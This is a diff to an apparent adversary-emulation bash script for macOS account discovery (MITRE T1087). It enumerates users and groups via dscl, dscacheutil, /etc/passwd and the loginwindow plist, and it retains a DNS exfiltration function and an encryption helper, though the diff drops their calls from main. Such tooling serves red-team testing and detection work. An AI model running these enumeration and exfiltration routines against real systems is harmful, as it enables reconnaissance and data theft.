@@ -25,7 +25,24 @@
 # - https://attack.mitre.org/techniques/T1087/003/
 # - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.001/T1087.001.yaml
 
-
+# Global Variables
+NAME="accounts_discovery"
+TACTIC="d   iscovery"
+TTP_ID="T1087"
+LOG_FILE="${TTP_ID}_${NAME}.log"
+USER=""
+CMD_LIST_USER_DIRS="ls -la /Users"
+CMD_LIST_DSCL_USERS="dscl . -list /Users"
+CMD_EXTRACT_PASSWD_USERS="cat /etc/passwd"
+CMD_SHOW_ID_INFO="id"
+CMD_LIST_LOGGED_USERS="who"
+CMD_READ_LOGINWINDOW_PLIST="defaults read /Library/Preferences/com.apple.loginwindow.plist"
+CMD_LIST_GROUPS_DSCACHEUTIL="dscacheutil -q group"
+CMD_LIST_GROUPS_DSCL="dscl . -list /Groups"
+CMD_LIST_GROUPS_ETC="grep -v '^#' /etc/group"
+CMD_LIST_GROUPS_ID="id -G"
+CMD_LIST_GROUPS_CMD="groups"
+CMD_LIST_DSCACHEUTIL_USERS="dscacheutil -q user"
 
 # Display help message
 display_help() {
@@ -74,6 +91,39 @@ display_help() {
     echo "Note: Some options may require elevated privileges to execute successfully."
 }
 
+# Get current user: used for logs only 
+# TODO: set USER as global var. This produces unwanted telemetry
+get_user() {
+    USER=$(whoami)
+}
+
+# Function to get the current timestamp
+get_timestamp() {
+    date +"%Y-%m-%d %H:%M:%S"
+}
+
+# Log command invocation 
+log() {
+    local output="$1"
+    local max_size_kb=$((5 * 1024))  # 5MB in kilobytes
+    local timestamp
+    timestamp=$(get_timestamp)
+
+    # Check file size using du
+    if [ -f "$LOG_FILE" ] && [ $(du -k "$LOG_FILE" | cut -f1) -ge $max_size_kb ]; then
+        local base_name="${LOG_FILE%.log}"
+        local rotate_count=1
+
+        # Rotate logs inside the filename
+        while [ -f "${base_name}.${rotate_count}.log" ]; do
+            rotate_count=$((rotate_count + 1))
+        done
+
+        mv "$LOG_FILE" "${base_name}.${rotate_count}.log"
+    fi
+}
+
+#key used to encrypt output
 generate_random_key() {
     openssl rand -base64 32 | tr -d '\n/'
 }
@@ -122,7 +172,6 @@ EXFIL_URI=""
 ENCRYPT="none"
 ENCRYPT_KEY=""
 LOG_ENABLED=false
-LOG_FILE=""
 
 # Parse command-line arguments
 while [ "$#" -gt 0 ]; do
@@ -258,71 +307,86 @@ exfiltrate_dns() {
     dig +short "end.$domain" A > /dev/null
 }
 
-# Account discovery functions
+
+# Run the get_user function to set the USER global variable
+get_user
+
+
+# Command functions invoked by args
 list_user_dirs() {
-    echo "User directories in /Users using ls -la command:"
-    ls -la /Users
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Discovered user directories; command: \"$CMD_LIST_USER_DIRS\""
+    $CMD_LIST_USER_DIRS
 }
 
 list_dscl_users() {
-    echo "Users listed by dscl . -list /Users command:"
-    dscl . -list /Users
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed users; command: \"$CMD_LIST_DSCL_USERS\""
+    $CMD_LIST_DSCL_USERS
 }
 
 extract_passwd_users() {
-    echo "Content of /etc/passwd file:"
-    cat /etc/passwd
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Retrieved content of /etc/passwd file; command: \"$CMD_EXTRACT_PASSWD_USERS\""
+    $CMD_EXTRACT_PASSWD_USERS
 }
 
 show_id_info() {
-    echo "Current user info from id command:"
-    id
-}
 
+    echo "[$(get_timestamp)]: user: $USER; msg: Obtained current user info; command: \"$CMD_SHOW_ID_INFO\""
+    $CMD_SHOW_ID_INFO
+} 
+
+LLU="[timestamp=$(get_timestamp)] user: $USER; msg: Listed logged in users; command: \"$CMD_LIST_LOGGED_USERS\""
 list_logged_users() {
-    echo "Currently logged in users from who command:"
-    who
+
+    echo "[timestamp=$(get_timestamp)] user: $USER; msg: Listed logged in users; command: \"$CMD_LIST_LOGGED_USERS\""
+    $CMD_LIST_LOGGED_USERS
 }
 
 read_loginwindow_plist() {
-    echo "Content of loginwindow plist using defaults read command:"
-    defaults read /Library/Preferences/com.apple.loginwindow.plist
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Read content of loginwindow plist; command: \"$CMD_READ_LOGINWINDOW_PLIST\""
+    $CMD_READ_LOGINWINDOW_PLIST
 }
 
 list_groups_dscacheutil() {
-    echo "Groups listed by dscacheutil -q group command:"
-    dscacheutil -q group
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCACHEUTIL\""
+    $CMD_LIST_GROUPS_DSCACHEUTIL
 }
 
 list_groups_dscl() {
-    echo "Groups listed by dscl . -list /Groups command:"
-    dscl . -list /Groups
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups; command: \"$CMD_LIST_GROUPS_DSCL\""
+    $CMD_LIST_GROUPS_DSCL
 }
 
 list_groups_etc() {
-    echo "Groups listed from /etc/group file:"
-    grep -v '^#' /etc/group
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups from /etc/group; command: \"$CMD_LIST_GROUPS_ETC\""
+    $CMD_LIST_GROUPS_ETC
 }
 
 list_groups_id() {
-    echo "Groups for current user using id -G command:"
-    id -G
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_ID\""
+    $CMD_LIST_GROUPS_ID
 }
 
 list_groups_cmd() {
-    echo "Groups for current user using groups command:"
-    groups
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed groups for the current user; command: \"$CMD_LIST_GROUPS_CMD\""
+    $CMD_LIST_GROUPS_CMD
 }
 
 list_dscacheutil_users() {
-    echo "Local users listed by dscacheutil -q user command:"
-    dscacheutil -q user
+
+    echo "[$(get_timestamp)]: user: $USER; msg: Listed local users; command: \"$CMD_LIST_DSCACHEUTIL_USERS\""
+    $CMD_LIST_DSCACHEUTIL_USERS
 }
 
 setup_logging() {
     local script_name=$(basename "$0" .sh)
-    local hash=$(echo $RANDOM | md5sum | head -c 8)
-    LOG_FILE="./${script_name}.${hash}.log"
     touch "$LOG_FILE"
 }
 
@@ -343,88 +407,93 @@ log_output() {
     fi
 }
 
+# Function to log output
+log_and_append() {
+    local result="$1"
+    
+    # Only log if logging is enabled
+    if [ "$LOG_ENABLED" = true ]; then
+        echo "$result" >> "$LOG_FILE"
+    fi
+}
+
 # Main function
 main() {
-    local output=""
-    
+    local output=""          # Variable to hold unencoded output
+    local encoded_output=""  # Variable to hold encoded output
+
+    # Setup logging if enabled
     if [ "$LOG_ENABLED" = true ]; then
         setup_logging
     fi
-    
+
+    # Handle all the invocations and capture output
     if [ "$ALL" = true ] || [ "$USER_DIRS" = true ]; then
-        output+="$(list_user_dirs)\n\n"
+        output+="$(list_user_dirs)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$DSCL_LIST" = true ]; then
-        output+="$(list_dscl_users)\n\n"
+        output+="$(list_dscl_users)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$PASSWD_EXTRACT" = true ]; then
-        output+="$(extract_passwd_users)\n\n"
+        output+="$(extract_passwd_users)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$ID_INFO" = true ]; then
-        output+="$(show_id_info)\n\n"
+        output+="$(show_id_info)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$WHO_LIST" = true ]; then
-        output+="$(list_logged_users)\n\n"
+        output+="$(list_logged_users)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$PLIST_READ" = true ]; then
-        output+="$(read_loginwindow_plist)\n\n"
+        output+="$(read_loginwindow_plist)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_DSCACHEUTIL" = true ]; then
-        output+="$(list_groups_dscacheutil)\n\n"
+        output+="$(list_groups_dscacheutil)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_DSCL" = true ]; then
-        output+="$(list_groups_dscl)\n\n"
+        output+="$(list_groups_dscl)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_ETC" = true ]; then
-        output+="$(list_groups_etc)\n\n"
+        output+="$(list_groups_etc)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_ID" = true ]; then
-        output+="$(list_groups_id)\n\n"
+        output+="$(list_groups_id)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$GROUP_ALL" = true ] || [ "$GROUP_CMD" = true ]; then
-        output+="$(list_groups_cmd)\n\n"
+        output+="$(list_groups_cmd)\n"
     fi
 
     if [ "$ALL" = true ] || [ "$DSCACHEUTIL_USERS" = true ]; then
-        output+="$(list_dscacheutil_users)\n\n"
+        output+="$(list_dscacheutil_users)\n"
     fi
 
-    # Encode output if specified
-    if [ "$ENCODE" != "none" ]; then
-        output=$(encode_output "$output")
-    fi
-
-    # Log output if enabled
+    # Check if logging is enabled and handle encoding
     if [ "$LOG_ENABLED" = true ]; then
-        log_output "$output"
-    fi
-
-    # Exfiltrate data if specified
-    if [ "$EXFIL" = true ]; then
-        if [ "$EXFIL_METHOD" = "dns" ]; then
-            if [ "$ENCRYPT" != "none" ]; then
-                encrypted_data=$(encrypt_data "$output" "$ENCRYPT" "$ENCRYPT_KEY")
-                exfiltrate_dns "$encrypted_data" "$EXFIL_URI" "$ENCRYPT_KEY"
-            else
-                exfiltrate_dns "$output" "$EXFIL_URI"
-            fi
+        if [ "$ENCODE" != "none" ]; then
+            encoded_output=$(encode_output "$output")
+            log_and_append "[$(get_timestamp)]: $encoded_output"  # Log the encoded output
         else
-            exfiltrate_http "$output" "$EXFIL_URI"
+            log_and_append "$output"  # Log the unencoded output
         fi
-    elif [ "$LOG_ENABLED" = false ]; then
-        # Only print to screen if logging is not enabled
-        echo -e "$output"
+    else
+        # Print to screen if logging is not enabled
+        if [ "$ENCODE" != "none" ]; then
+            encoded_output=$(encode_output "$output")
+            echo -e "$encoded_output"
+        else
+            echo -e "$output"
+        fi
     fi
 }
+
 
 main
